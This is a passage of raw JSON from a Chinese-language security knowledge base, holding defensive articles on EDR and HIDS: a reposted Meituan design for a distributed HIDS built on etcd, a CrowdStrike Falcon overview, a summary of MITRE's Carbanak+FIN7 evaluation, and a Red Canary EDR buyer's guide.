驱动器）执行静态、按需恶意软件检测扫描。\r\n  - 所有功能都必须在单个agent/sensor中提供或直接集成到操作系统中。\r\n\r\n# 5. 参考资料\r\n- [https://www.gartner.com/doc/reprints?ct=210506&id=1-25Z4TEJM&st=sb](https://www.gartner.com/doc/reprints?ct=210506&id=1-25Z4TEJM&st=sb)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/终端基础设施/EDR/保障IDC安全：分布式HIDS集群架构设计/","title":"保障IDC安全：分布式HIDS集群架构设计"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 保障IDC安全：分布式HIDS集群架构设计\r\ntags:\r\n- Blue Team基础设施\r\n- 终端基础设施\r\n- EDR\r\n---\r\n\r\n# 1. 转载自美团技术团队\r\n- [https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html](https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html)\r\n\r\n# 2. 背景\r\n近年来，互联网上安全事件频发，企业信息安全越来越受到重视，而IDC服务器安全又是纵深防御体系中的重要一环。保障IDC安全，常用的是基于主机型入侵检测系统Host-based Intrusion Detection System，即HIDS。在HIDS面对几十万台甚至上百万台规模的IDC环境时，系统架构该如何设计呢？复杂的服务器环境，网络环境，巨大的数据量给我们带来了哪些技术挑战呢？\r\n\r\n# 3. 需求描述\r\n对于HIDS产品，我们安全部门的产品经理提出了以下需求：\r\n\r\n- 满足50W-100W服务器量级的IDC规模。\r\n- 部署在高并发服务器生产环境，要求Agent低性能低损耗。\r\n- 广泛的部署兼容性。\r\n- 偏向应用层和用户态入侵检测（可以和内核态检测部分解耦）。\r\n- 针对利用主机Agent排查漏洞的最急需场景提供基本的能力，可以实现海量环境下快速查找系统漏洞。\r\n- Agent跟Server的配置下发通道安全。\r\n- 配置信息读取写入需要鉴权。\r\n- 配置变更历史记录。\r\n- Agent插件具备自更新功能。\r\n\r\n# 4. 分析需求\r\n  - 首先，服务器业务进程优先级高，HIDS Agent进程自己可以终止，但不能影响宿主机的主要业务，这是第一要点，那么业务需要具备熔断功能，并具备自我恢复能力。\r\n  - 其次，进程保活、维持心跳、实时获取新指令能力，百万台Agent的全量控制时间一定要短。举个极端的例子，当Agent出现紧急情况，需要全量停止时，那么全量停止的命令下发，需要在1-2分钟内完成，甚至30秒、20秒内完成。这些将会是很大的技术挑战。\r\n  - 还有对配置动态更新，日志级别控制，细分精确控制到每个Agent上的每个HIDS子进程，能自由地控制每个进程的启停，每个Agent的参数，也能精确的感知每台Agent的上线、下线情况。\r\n  - 同时，Agent本身是安全Agent，安全的因素也要考虑进去，包括通信通道的安全性，配置管理的安全性等等。\r\n  - 最后，服务端也要有一致性保障、可用性保障，对于大量Agent的管理，必须能实现任务分摊，并行处理任务，且保证数据的一致性。考虑到公司规模不断地扩大，业务不断地增多，特别是美团和大众点评合并后，面对的各种操作系统问题，产品还要具备良好的兼容性、可维护性等。\r\n  - 总结下来，产品架构要符合以下特性：\r\n    - 集群高可用。\r\n    - 分布式，去中心化。\r\n    - 配置一致性，配置多版本可追溯。\r\n    - 分治与汇总。\r\n    - 兼容部署各种Linux 服务器，只维护一个版本。\r\n    - 节省资源，占用较少的CPU、内存。\r\n    - 精确的熔断限流。\r\n    - 服务器数量规模达到百万级的集群负载能力。\r\n\r\n# 5. 技术难点：\r\n在列出产品需要实现的功能点、技术点后，再来分析下遇到的技术挑战，包括不限于以下几点：\r\n\r\n- 资源限制，较小的CPU、内存。\r\n- 五十万甚至一百万台服务器的Agent处理控制问题。\r\n- 量级大了后，集群控制带来的控制效率，响应延迟，数据一致性问题。\r\n- 量级大了后，数据传输对整个服务器内网带来的流量冲击问题。\r\n- 量级大了后，运行环境更复杂，Agent异常表现的感知问题。\r\n- 量级大了后，业务日志、程序运行日志的传输、存储问题，被监控业务访问量突增带来监控数据联突增，对内网带宽，存储集群的爆发压力问题。\r\n\r\n我们可以看到，技术难点几乎都是服务器到达一定量级带来的，对于大量的服务，集群分布式是业界常见的解决方案。\r\n\r\n# 6. 架构设计与技术选型\r\n对于管理Agent的服务端来说，要实现高可用、容灾设计，那么一定要做多机房部署，就一定会遇到数据一致性问题。那么数据的存储，就要考虑分布式存储组件。 分布式数据存储中，存在一个定理叫`CAP定理`：\r\n\r\n![lxjgAk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/lxjgAk.jpg)\r\n\r\n**CAP的解释**:\r\n- 关于`CAP定理`，分为以下三点：\r\n  - 一致性（Consistency）：分布式数据库的数据保持一致。\r\n  - 可用性（Availability）：任何一个节点宕机，其他节点可以继续对外提供服务。\r\n  - 分区容错性（网络分区）Partition Tolerance：一个数据库所在的机器坏了，如硬盘坏了，数据丢失了，可以添加一台机器，然后从其他正常的机器把备份的数据同步过来。\r\n- 根据定理，分布式系统只能满足三项中的两项而不可能满足全部三项。理解CAP定理的最简单方式是想象两个节点分处分区两侧。允许至少一个节点更新状态会导致数据不一致，即丧失了Consistency。如果为了保证数据一致性，将分区一侧的节点设置为不可用，那么又丧失了Availability。除非两个节点可以互相通信，才能既保证Consistency又保证Availability，这又会导致丧失Partition Tolerance。\r\n- 参见：[CAP Theorem](https://en.wikipedia.org/wiki/CAP_theorem)\r\n\r\n**CAP的选择**:\r\n- 为了容灾上设计，集群节点的部署，会选择的异地多机房，所以 「Partition tolerance」是不可能避免的。那么可选的是 `AP` 与 `CP`。\r\n- 在HIDS集群的场景里，各个Agent对集群持续可用性没有非常强的要求，在短暂时间内，是可以出现异常，出现无法通讯的情况。但最终状态必须要一致，不能存在集群下发关停指令，而出现个别Agent不听从集群控制的情况出现。所以，我们需要一个满足 `CP` 的产品。\r\n\r\n# 7. 满足CP的产品选择\r\n  - 在开源社区中，比较出名的几款满足CP的产品，比如etcd、ZooKeeper、Consul等。我们需要根据几款产品的特点，根据我们需求来选择符合我们需求的产品。\r\n  - 插一句，网上很多人说Consul是AP产品，这是个错误的描述。既然Consul支持分布式部署，那么一定会出现「网络分区」的问题， 那么一定要支持「Partition tolerance」。另外，在consul的官网上自己也提到了这点 Consul uses a CP architecture, favoring consistency over availability.\r\n  \r\n    > Consul is opinionated in its usage while Serf is a more flexible and general purpose tool. In CAP terms, Consul uses a CP architecture, favoring consistency over availability. Serf is an AP system and sacrifices consistency for availability. This means Consul cannot operate if the central servers cannot form a quorum while Serf will continue to function under almost all circumstances.\r\n\r\n  - **etcd、ZooKeeper、Consul对比**\r\n\r\n    - 借用etcd官网上etcd与ZooKeeper和Consul的比较图。\r\n    - ![XotcyC](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/XotcyC.jpg)\r\n    - 在我们HIDS Agent的需求中，除了基本的`服务发现` 、`配置同步` 、`配置多版本控制` 、`变更通知`等基本需求外，我们还有基于产品安全性上的考虑，比如`传输通道加密`、`用户权限控制`、`角色管理`、`基于Key的权限设定`等，这点 `etcd` 比较符合我们要求。很多大型公司都在使用，比如`Kubernetes`、`AWS`、`OpenStack`、`Azure`、`Google Cloud`、`Huawei Cloud`等，并且`etcd`的社区支持非常好。基于这几点因素，我们选择etcd作为HIDS的分布式集群管理。\r\n\r\n# 8. 分布式HIDS集群架构图\r\n![c09vZx](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/c09vZx.jpg)\r\n\r\n# 9. 编程语言选择\r\n考虑到公司服务器量大，业务复杂，需求环境多变，操作系统可能包括各种Linux以及Windows等。为了保证系统的兼容性，我们选择了Golang作为开发语言，它具备以下特点：\r\n\r\n- 可以静态编译，直接通过syscall来运行，不依赖libc，兼容性高，可以在所有Linux上执行，部署便捷。\r\n- 静态编译语言，能将简单的错误在编译前就发现。\r\n- 具备良好的GC机制，占用系统资源少，开发成本低。\r\n- 容器化的很多产品都是Golang编写，比如Kubernetes、Docker等。\r\n- etcd项目也是Golang编写，类库、测试用例可以直接用，SDK支持快速。\r\n- 良好的CSP并发模型支持，高效的协程调度机制。\r\n\r\n# 10. 产品架构大方向\r\n  - HIDS产品研发完成后，部署的服务都运行着各种业务的服务器，业务的重要性排在第一，我们产品的功能排在后面。为此，确定了几个产品的大方向：\r\n    - 高可用，数据一致，可横向扩展。\r\n    - 容灾性好，能应对机房级的网络故障。\r\n    - 兼容性好，只维护一个版本的Agent。\r\n    - 依赖低，不依赖任何动态链接库。\r\n    - 侵入性低，不做Hook，不做系统类库更改。\r\n    - 熔断降级可靠，宁可自己挂掉，也不影响业务 。\r\n\r\n# 11. 框架设计\r\n![XMnpix](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/XMnpix.jpg)\r\n\r\n如上图，在框架的设计上，封装常用类库，抽象化定义`Interface`，剥离`etcd Client`，全局化`Logger`，抽象化App的启动、退出方法。使得各`模块`（以下简称`App`）只需要实现自己的业务即可，可以方便快捷的进行逻辑编写，无需关心底层实现、配置来源、重试次数、熔断方案等等。\r\n\r\n后面不再copy，感兴趣请参考原文"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/终端基础设施/EDR商业化产品/CrowdStrike Falcon/","title":"CrowdStrike Falcon"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: CrowdStrike Falcon\r\ntags:\r\n- Blue Team基础设施\r\n- 终端基础设施\r\n- EDR商业化产品\r\n- CrowdStrike\r\n---\r\n\r\n# 1. CrowdStrike EDR 解决方案中最重要的是什么？\r\n![NsTQNy](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/NsTQNy.jpg)\r\n\r\n- **找到能够提供最高级别的保护同时需要最少的努力和投资的 EDR 安全解决方案非常重要**——在不耗尽资源的情况下为您的安全团队增加价值。以下是您应该寻找的 EDR 的六个关键方面：\r\n\r\n  - **可见度：**跨所有终端的实时可见性，从而可以检测发现攻击者活动，进而实施阻断。\r\n  - **威胁数据库：**EDR 需要从终端收集大量遥测数据并丰富上下文，因此可以使用各种分析技术挖掘攻击迹象。\r\n  - **行为保护：**仅依赖基于签名或IOC会导致检测能力被轻易绕过，从而导致数据泄露；EDR需要能通过行为来搜索攻击指标 (IOAs，crowdstrike发明的)，以便在发生危害之前收到可疑活动的告警。\r\n\r\n- TODO > 什么是攻击指标 Indicators of attack (IOA)？\r\n  攻击指标 (IOA)侧重于检测攻击者试图完成的目标的意图，而不管攻击中使用的恶意软件或漏洞。就像杀毒软件的签名一样，基于 IOC 的检测方法无法检测到0day攻击和免杀恶意软件。\r\n\r\n  >比如鱼叉攻击，必须欺骗目标点击链接或打开恶意文件/文档，一旦机器沦陷，攻击者将默默地执行另一个进程，隐藏在内存或磁盘中，并在系统重新启动后维持权限；然后与C2联系，等待进一步的指示。\r\n  >\r\n  >IOA 关注这些具体步骤的执行、对手的意图以及他试图实现的结果。IOA并不关注他用来实现目标的特定工具，而实监控关键行动，通过有状态执行检查引擎(Stateful Execution Inspection Engine)来收集和使用指标(indicators )，我们可以确定攻击者如何成功访问网络并推断其意图。\r\n\r\n  - **洞察力和智慧：**集成威胁情报的EDR解决方案可以提供上下文，包括攻击您的特定对手的详细信息或有关攻击的其他信息。\r\n  - **快速响应：**EDR能够对事件做出快速准确的响应，可以在攻击造成影响之前阻止攻击，并快速恢复业务。\r\n  - **基于云：**基于云的EDR解决方案可以降低对终端的影响，同时确保可以准确、实时地完成搜索、分析和调查等功能。\r\n\r\n# 2. CrowdStrike EDR 是如何工作的？\r\n- EDR解决方案的工作原理是提供对终端上发生事情的持续和全面的实时检测/监控。然后将行为分析和可操作的情报应用于终端数据，以阻止攻击告警演变为安全事件。功能包括：\r\n  - **1. 自动发现未知攻击者**\r\n    - Falcon Insight 将所有终端的遥测数据与IOA配对，并使用其行为来分析数十亿事件，自动检测可疑行为的痕迹；如果一系列事件和告警与已知 IOA匹配，agent将把该活动标记为恶意并自动发送告警；用户还可以编写自己的搜索条件，Falcon Insight的云架构可在5 秒或更短的时间内返回查询结果。\r\n  - **2. 与威胁情报集成**\r\n    - 可以更快地检测被识别为恶意的TTPs，并提供了上下文信息，其中包括相关的归因，提供有关攻击者的详细信息以及有关攻击的任何其他信息。\r\n  - **3. 主动防御，托管式威胁狩猎**\r\n    - 作为 Falcon 平台的一部分，Falcon OverWatch™ 托管威胁追踪服务增加了一个额外的保护能力，安全专家会帮助客户采取行动，以确保不会遗漏威胁，并最终防止发生大规模泄露。\r\n  - **4. 提供实时/历史的可见性**\r\n    - Falcon Insight就像终端上的 DVR，记录相关活动以捕捉尝试绕过检测的安全事件；Falcon agent跟踪了数百个不同的安全相关事件，例如进程创建、驱动程序加载、注册表修改、磁盘访问、内存访问或网络连接等，客户可以从安全角度全面了解其终端上发生的一切。\r\n    - 这为安全团队提供了他们需要的有用信息，包括：\r\n      - 内外与外部的网络连接\r\n      - 直接/远程登录的所有用户帐户\r\n      - ASP 密钥的变更、可执行文件和管理工具的使用\r\n      - 进程执行\r\n      - 详细的进程级别的网络活动，包括 DNS 请求、连接和开放端口\r\n      - 存档文件创建，包括 RAR 和 ZIPS\r\n      - USB等外部存储介质\r\n  - **5. 加速调查**\r\n    - 能够加快调查和最终修复的速度，因为从终端收集的信息通过Falcon 平台存储在 CrowdStrike 云中，使用了一个图形数据库来跟踪每个终端事件之间的所有关系和联系，该数据库可以快速、大规模地提供历史和实时数据的详细信息和上下文，这使安全团队能够有效地跟踪即使是最复杂的攻击，并及时发现事件，并对它们进行分类、验证和确定优先级，从而更快、更精确地进行补救。\r\n  - **6. 实现快速的修复**\r\n    - Falcon Insight 可以隔离终端，它允许组织通过将可能受到威胁的主机与所有网络活动隔离开来采取迅速和即时的行动。当终端受被隔离，它仍然可以从 CrowdStrike 云发送和接收信息，但即使与云的连接被切断，它仍将保持被隔离，并在重新启动期间保持这种隔离状态。\r\n    - **在应对新出现的威胁时，时间至关重要，响应者需要实时、深入的可见性，以便他们能够快速果断地进行补救。**\r\n    - **信息收集器**允许安全团队通过执行以下任务，以了解威胁的风险和范围：\r\n      - 浏览文件系统并提取文件\r\n      - 列出正在运行的进程\r\n      - 提取 Windows 事件日志\r\n      - 查询 Windows 注册表\r\n      - 列出当前的网络连接和配置\r\n      - 提取进程内存\r\n      - 计算文件哈希\r\n      - 收集环境变量\r\n      - 使用 PowerShell 或其他工具收集其他所需信息\r\n    - **补救措施**使团队能够迅速而果断地采取行动来遏制或补救威胁，包括：\r\n      - 删除文件\r\n      - 结束一个进程\r\n      - 删除或修改 Windows 注册表项或值\r\n      - 上传文件\r\n      - 运行脚本或可执行文件\r\n      - 加密文件\r\n      - 重启/关机\r\n- 借助 CrowdStrike 的云原生架构、轻量级agent和统一控制台，实时响应功能可以交付到世界上任何地方的任何系统，而对成本或性能的影响几乎为零。\r\n\r\n# 3. 参考资料\r\n- [https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/](https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/)\r\n- [https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/](https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/终端基础设施/EDR能力评估/MITRE EDR技术能力评估/","title":"MITRE EDR技术能力评估"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: MITRE EDR技术能力评估\r\ntags:\r\n- Blue Team基础设施\r\n- 终端基础设施\r\n- EDR能力评估\r\n- 能力评估\r\n- MITRE\r\n---\r\n\r\n# 1. 背景\r\nMITRE每年会举办一次安全产品能力评估，通过ATT&CK和真实的APT案例进行攻击模拟，最大程度环境真实的攻击场景，整体过程分为以下三步：\r\n- **1. 设计阶段**\r\n  - 选择威胁（APT事件、恶意软件等）\r\n    - 意图： 考虑安全社区最关注的问题（例如，勒索软件与数据窃取）\r\n    - 差异化： 平衡使用新的和以前测试过的技术\r\n    - 复杂性： 考虑开发资源以及我们是在基线还是推动防御\r\n    - 情报： 我们评估情报的数量和质量以彻底了解对手\r\n  - 创建仿真计划\r\n    - 分解： 将网络威胁情报 (CTI) 提取到单独的程序中\r\n    - 链接： 将程序重新编译并组织成一个更大的仿真场景\r\n    - 细化： 我们通过合作和有针对性的研究填补空白\r\n  - 开发仿真\r\n    - 工具： 选择/构建可以真实还原行为的攻击性工具\r\n    - 定制： 捕捉重要的细节（例如，投递机制、C2等）\r\n    - 回顾： 与 CTI 进行比较并注意偏差\r\n    - 创建： 将所有信息编译成一个结构化的仿真计划\r\n- **2. 执行阶段**\r\n  - 访问环境\r\n    - 环境： 为所有厂商供提供相同的执行环境\r\n    - 噪音(仿真)： 除了模拟技术（例如键盘记录）所需的活动之外，还有用户活动\r\n  - 部署解决方案\r\n    - 解决方案： 厂商使用实际配置配置其解决方案\r\n    - 配置： 厂商确保预防、保护和响应仅用于检测评估，并自动用于保护评估\r\n    - * 注意：未经明确批准，禁止在评估开始后更改配置\r\n  - 执行评估\r\n    - 评估者：兼任攻击者和监考者，并提供检测指导以协助厂商\r\n    - 防守方： 厂商担任紫队的角色\r\n- **3. 发布**\r\n  - 处理结果\r\n    - 独特性： 独立考虑每个厂商\r\n    - 一致性： 校准所有结果以确保一致性\r\n  - 接收反馈\r\n    - 审核： 厂商有 10 天的时间提供反馈，其中可以包括要考虑纳入的其他数据，或对初步结果的修改\r\n    - 分析： 会考虑所有反馈并做出最终决定\r\n  - 发布结果\r\n    - 脱敏： 厂商对敏感性问题（例如规则逻辑）进行最终审查\r\n    - 发布： 公开发布结果和方法\r\n\r\n# 2. 2021年的评估模拟Carbanak + FIN7\r\n- 介绍\r\n  - **Carbanak 场景**： 合法用户执行通过针对金融机构的鱼叉式网络钓鱼攻击提供的恶意载荷。在拿到权限之后，Carbanak 通过特权升级、凭证访问和横向移动来扩展对其他主机的访问，目的是破坏货币处理服务、自动柜员机和金融账户。当 Carbanak 损害潜在有价值的目标时，他们会建立持久性，以便他们可以了解金融组织的内部程序和技术。使用这些信息，Carbanak 将资金转移到他们控制的银行账户，\r\n  - **FIN7 场景**：此场景模拟 FIN7 以酒店经理为目标，以获取信用卡信息。该场景开始于 FIN7 在不知情的用户执行恶意 .LNK 文件后实现对网络的初始访问权限。FIN7 然后转向特权 IT 管理员工作站。从这个系统，FIN7 键盘记录访问会计工作站所需的凭据。FIN7 然后转向会计工作站，建立持久性，并部署恶意软件从进程内存中抓取信用卡信息。\r\n- 操作流程\r\n  - ![65iZsu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/65iZsu.jpg)\r\n- 技术范围\r\n  - 对于 Carbanak 和 FIN7 评估，11 种 ATT&CK 策略中的 65 种 ATT&CK 技术都在此评估范围内。这包括涵盖 Carbanak 评估的 Linux 部分的 7 种 ATT&CK 策略中的 12 种 ATT&CK 技术。\r\n  - 您可以通过查看我们在[此处](https://mitre-attack.github.io/attack-navigator/v2/enterprise/#layerURL=https://raw.githubusercontent.com/attackevals/website/master/downloadable_JSON/CarbanakFin7_Navigator_layer.json)提供的层文件，在 ATT&CK 导航器中查看 Carbanak+FIN7 评估的范围内技术。预览图如下！专门归因于 Carbanak 的范围内的技术以蓝色突出显示，专门归因于 FIN7 的技术以红色突出显示，而 Carbanak 和 FIN7 均以黄色突出显示。\r\n  - ![IxwRMn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/IxwRMn.jpg)\r\n- 环境\r\n  - 评估是在 Microsoft Azure 中进行的。每个供应商都提供了两个相同的环境，由八台主机组成，每台主机都安装了他们的客户端软件。这两种环境分别用于仅检测和保护测试。\r\n  - ![9CiRAa](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/9CiRAa.jpg)\r\n\r\n# 3. 举例：CrowdStrike评估结果\r\n- 告警策略\r\n  - 攻击相关的指标都被分配了严重等级（信息、低、中、高、严重），同时还包含了丰富的上下文信息，如概述、对应的ATT&CK、进程、用户、主机及对应的资产信息等。此外，还使用CrowdScore（满分 10，结合攻击行为，跨进程、跨机器）来衡量当前攻击行为在客户环境的严重程度。\r\n- 其他策略\r\n  - ![xoqt1H](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/xoqt1H.jpg)\r\n\r\n# 4. 参考资料\r\n- [https://attackevals.mitre-engenuity.org/enterprise/participants/crowdstrike/results?adversary=carbanak_fin7&scenario=1#carbanak_fin7_test_11](https://attackevals.mitre-engenuity.org/enterprise/participants/crowdstrike/results?adversary=carbanak_fin7&scenario=1#carbanak_fin7_test_11)\r\n- [https://attackevals.mitre-engenuity.org/enterprise/carbanak_fin7](https://attackevals.mitre-engenuity.org/enterprise/carbanak_fin7)"},{"fields":{"slug":"/安全知识库/Blue Team基础设施/终端基础设施/EDR能力评估/Red Canary EDR买家指南/","title":"Red Canary EDR买家指南"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Red Canary EDR买家指南\r\ntags:\r\n- Blue Team基础设施\r\n- 终端基础设施\r\n- EDR能力评估\r\n- Red Canary\r\n---\r\n\r\n# 1. 背景\r\nRed Canary 的技术团队一直在关注 EDR 市场，评估新技术，并已成功指导数以千计的组织进行 EDR 的评估和实施，本指南是在这个过程中自然而然产出的。在购买EDR前我们需要了解：\r\n\r\n- 公司的业务需求、技术要求和内部能力\r\n- EDR产品对公司安全运营带来的潜在影响\r\n- 用来区分EDR产品的关键因素是什么\r\n\r\n本指南重点介绍了每个安全团队在购买 EDR 产品之前需要回答的 14 个问题。\r\n\r\n# 2. 最重要的问题\r\n为什么要购买EDR产品?\r\n- 购买 EDR 产品的原因有很多，了解您的目标是关键第一步。\r\n\r\n**业务侧重点**\r\n- 使用该解决方案需要什么水平的专业知识和时间投入？\r\n  - ![9P2IbH](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/9P2IbH.jpg)\r\n  - 厂商提供的解决方案：MDR和MSSP。\r\n- 部署时对业务有什么影响？\r\n  - EDR 解决方案应该可以使用任何本机或第三方部署实用程序轻松部署到终端。 需要重启的解决方案可能会产生重大的业务影响，并需要更多的组织协调。\r\n- 能否取代现有的终端安全方案？\r\n  - 今天的许多 EDR 解决方案并不直接取代常见的安全方案，而是专注于加强安全态势的特定部分；常见的现有终端安全方案有：\r\n    - 杀毒软件、DLP、FIM、HIDS、UBA等。\r\n\r\n**技术能力**\r\n- 支持哪些平台和操作系统？\r\n  - 理想情况下，单一解决方案将适用于服务器、PC、笔记本电脑和其他终端。\r\n- 提供什么级别的可见性？\r\n  - 如果 EDR 缺乏对数据的收集，则它的价值有限； 把它想象成一个物理安全系统：光学安全摄像头远不如能同时收集 X 射线、红外线和振动数据的摄像头。\r\n  - 常见的数据包含：进程信息、网络连接、文件修改记录、注册表记录、二进制文件、内容、用户信息等。\r\n- 如何与预防措施相结合？\r\n  - EDR 解决方案越来越多地成为终端保护平台的一部分，而不是独立的工具。 选择具有“多合一”的解决方案非常重要。\r\n- 如何检测面临的威胁？\r\n  - 了解 EDR 解决方案检测到的威胁类型以及使用的技术和技巧应该是评估的核心。 许多解决方案采用非常有限的检测方法，并且无法提供更广泛的威胁覆盖范围。\r\n  - 包含：覆盖范围、误报率、漏报率、响应时间、有效性等。\r\n- 提供什么样的响应处置能力？\r\n  - 需要能够立即对威胁做出反应并在它对您的组织造成更大损害之前阻止它。\r\n- 有哪些类型的报告可用？\r\n  - EDR 解决方案提供的报告对于获得的价值至关重要；这适用于随每个威胁检测提供的报告以及有关终端和企业的摘要报告。\r\n\r\n**安全能力整合**\r\n- 是否与其他安全工具集成/联动？\r\n  - 将 EDR 深度集成到现有的安全能力和 IT 工具，能够最有效地从解决方案中获得最大价值。\r\n- 对终端会造成什么影响?\r\n  - 几乎所有 EDR 解决方案都通过Agent方式部署到终端，这意味着如果它没有经过良好的设计和测试，可能会产生严重的性能影响并导致不稳定。 应该提供在类似操作系统和硬件上测试的性能数据，以及在运行类似应用程序时的性能数据。\r\n- 使用哪些安全控制来保护自己免受攻击者的攻击？\r\n  - 如果设计不当，EDR 解决方案可能会带来巨大的安全风险；确保EDR自身都有严格的安全策略，并经过第三方测试。\r\n- 厂商提供哪些支持？\r\n  - 厂商提供的技术支持将极大地影响潜在成本以及部署、排除故障和优化 EDR 解决方案的能力。\r\n\r\n# 3. 参考资料\r\n- [https://docs.google.com/viewerng/viewer?url=https://resource.redcanary.com/rs/003-YRU-314/images/EDR-Buyers-Guide-2020.pdf](https://docs.google.com/viewerng/viewer?url=https://resource.redcanary.com/rs/003-YRU-314/images/EDR-Buyers-Guide-2020.pdf)"}]}}}